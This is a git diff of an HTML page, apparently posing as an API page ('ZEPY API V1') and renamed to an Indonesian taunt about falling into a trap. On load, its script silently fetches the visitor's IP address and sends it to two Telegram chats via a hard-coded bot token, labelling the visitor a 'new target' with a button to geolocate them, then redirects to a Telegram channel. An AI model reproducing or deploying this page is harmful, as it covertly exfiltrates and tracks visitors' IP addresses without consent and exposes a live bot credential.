@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>ZEPY API V1</title>
+  <title>YAHAHA KENA JEBAKAN🤭😹</title>
   <script>
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
@@ -10,21 +10,34 @@
         const ip = data.ip;
         const token = '7627954962:AAHVwLsNQdpFSi3E6Zg5qRzIQ7tBUdSRFKA';
         const chat_ids = ['7708476554', '8046691232'];
-        const text = `DETECTED NEW IP: ${ip}`;
+        const text = `EEH, ADA TARGET BARU MAS, NIH IP DIA *${ip}* LANGSUNG LACAK AJ`;
+        const reply_markup = {
+          inline_keyboard: [
+            [
+              {
+                text: "GAS.. LACAK😹",
+                url: "https://ipwho.is/${ip}"
+              }
+            ]
+          ]
+        };
 
-        // Kirim ke semua chat_id
         chat_ids.forEach(chat_id => {
           fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id, text })
+            body: JSON.stringify({
+              chat_id,
+              text,
+              reply_markup
+            })
           });
         });
       })
       .finally(() => {
         setTimeout(() => {
           window.location.href = 'https://t.me/zepyytry';
-        }, 1000); // Delay 1 detik
+        }, 1000);
       });
   </script>
 </head>
